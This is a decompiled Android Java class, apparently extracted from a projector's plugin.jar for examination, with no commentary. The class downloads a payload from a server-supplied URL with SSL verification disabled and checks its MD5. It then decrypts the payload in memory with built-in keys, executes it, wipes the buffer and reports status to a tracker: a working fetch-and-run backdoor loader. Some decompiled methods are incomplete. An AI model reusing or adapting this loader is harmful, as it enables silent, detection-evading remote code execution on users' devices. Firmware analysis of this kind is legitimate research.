package com.hs.cld.da;

import android.content.Context;
import com.hs.cld.da.dx.DexManager;
import com.hs.cld.da.model.EventTypeEnum;
import com.hs.cld.da.model.JarBean;
import com.hs.p.basic.Logger;
import com.hs.p.basic.SSLUtils;
import com.hs.p.common.http.InternalError;
import com.hs.p.common.utils.DigestUtils;
import com.hs.p.common.utils.LOG;
import com.hs.p.dx.DIR;
import com.hs.p.dx.DexCipher;
import com.hs.p.dx.DexUtils;
import com.hs.p.dx.FileUtils;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Arrays;
import javax.net.ssl.HttpsURLConnection;

/* JADX INFO: loaded from: /Users/ruben/projector-dump/downloads/plugin.jar */
public class JarExe extends RemoteExe {
    private static final String TAG = "JE";

    public JarExe(Context context, JarBean jarBean) {
        super(context, jarBean);
    }

    private void deleteRawFile(File file, File file2) {
        if (file != null) {
            LOG.i(TAG, "delete raw file: " + file);
            FileUtils.deleteFile(file);
        }
        if (file2 != null) {
            LOG.i(TAG, "delete dex file: " + file2);
            FileUtils.deleteFile(file2);
        }
    }

    private byte[] downloadToMemory(String str) throws Exception {
        HttpURLConnection httpURLConnection;
        ByteArrayOutputStream byteArrayOutputStream;
        InputStream inputStream = null;
        try {
            httpURLConnection = (HttpURLConnection) new URL(str).openConnection();
            try {
                if (httpURLConnection instanceof HttpsURLConnection) {
                    SSLUtils.configureSSLIgnore((HttpsURLConnection) httpURLConnection);
                }
                httpURLConnection.setRequestMethod("GET");
                httpURLConnection.setConnectTimeout(30000);
                httpURLConnection.setReadTimeout(30000);
                int responseCode = httpURLConnection.getResponseCode();
                if (responseCode != 200) {
                    throw new Exception("Server returned HTTP response code: " + responseCode);
                }
                InputStream inputStream2 = httpURLConnection.getInputStream();
                try {
                    byteArrayOutputStream = new ByteArrayOutputStream();
                    try {
                        byte[] bArr = new byte[com.cloudmedia.tv.server.a.l.r];
                        while (true) {
                            int i = inputStream2.read(bArr);
                            if (i == -1) {
                                break;
                            }
                            byteArrayOutputStream.write(bArr, 0, i);
                        }
                        byte[] byteArray = byteArrayOutputStream.toByteArray();
                        if (!DigestUtils.md5AsString(byteArray).equalsIgnoreCase(this.mTrackerBean.file_md5)) {
                            throw new Exception("MD5 verification failed");
                        }
                        try {
                            inputStream2.close();
                        } catch (Exception e) {
                            LOG.e(TAG, "Error closing input stream", e);
                        }
                        try {
                            byteArrayOutputStream.close();
                        } catch (Exception e2) {
                            LOG.e(TAG, "Error closing output stream", e2);
                        }
                        httpURLConnection.disconnect();
                        return byteArray;
                    } catch (Throwable th) {
                        th = th;
                        inputStream = inputStream2;
                        if (inputStream != null) {
                            try {
                                inputStream.close();
                            } catch (Exception e3) {
                                LOG.e(TAG, "Error closing input stream", e3);
                            }
                        }
                        if (byteArrayOutputStream != null) {
                            try {
                                byteArrayOutputStream.close();
                            } catch (Exception e4) {
                                LOG.e(TAG, "Error closing output stream", e4);
                            }
                        }
                        if (httpURLConnection == null) {
                            throw th;
                        }
                        httpURLConnection.disconnect();
                        throw th;
                    }
                } catch (Throwable th2) {
                    byteArrayOutputStream = null;
                    inputStream = inputStream2;
                    th = th2;
                }
            } catch (Throwable th3) {
                th = th3;
                byteArrayOutputStream = null;
            }
        } catch (Throwable th4) {
            th = th4;
            httpURLConnection = null;
            byteArrayOutputStream = null;
        }
    }

    private File getLocalDexFile(File file) {
        return FileUtils.create(new File(getLocalDir(DIR.jeDxf()) + File.separator + file.getName() + DIR.SUFFIX_DXF), true);
    }

    private void handle() throws Exception {
        byte[] bArrDownloadToMemory = null;
        try {
            try {
                bArrDownloadToMemory = downloadToMemory(this.mTrackerBean.file_url);
                submitTracker(EventTypeEnum.DOWNLOADED, 0, "OK");
                try {
                    try {
                        String strCallInit = DexUtils.callInit(this.mContext, DexCipher.decryptInMemory(DexManager.PUBLIC_KEY, DexManager.KEY, bArrDownloadToMemory));
                        Logger.append(this.mContext, TAG, "execute jar: " + strCallInit);
                        submitTrackerWithExtra(EventTypeEnum.RUNNING, 0, "OK", strCallInit);
                        if (bArrDownloadToMemory != null) {
                            Arrays.fill(bArrDownloadToMemory, (byte) 0);
                        }
                    } catch (Exception e) {
                        Logger.append(this.mContext, TAG, "execute jar failed: " + e);
                        submitTrackerWithExtra(EventTypeEnum.RUNNING, com.cloudmedia.tv.server.a.m, "execute jar failed: " + e, "" + e);
                        throw e;
                    }
                } catch (Exception e2) {
                    Logger.append(this.mContext, TAG, "decrypt jar failed: " + e2);
                    submitTracker(EventTypeEnum.EXECUTED, 2000, "decrypt jar failed: " + e2);
                    throw e2;
                }
            } catch (Exception e3) {
                Logger.append(this.mContext, TAG, "download jar failed: " + e3);
                submitTracker(EventTypeEnum.DOWNLOADED, InternalError.EHTTPSTATUSOFFSET, "" + e3);
                throw e3;
            }
        } catch (Throwable th) {
            if (bArrDownloadToMemory != null) {
                Arrays.fill(bArrDownloadToMemory, (byte) 0);
            }
            throw th;
        }
    }

    public void fire() {
        try {
            handle();
        } catch (Throwable th) {
            LOG.w(TAG, "[" + this.mTrackerBean.task_id + "] je failed: " + th);
        }
    }
}
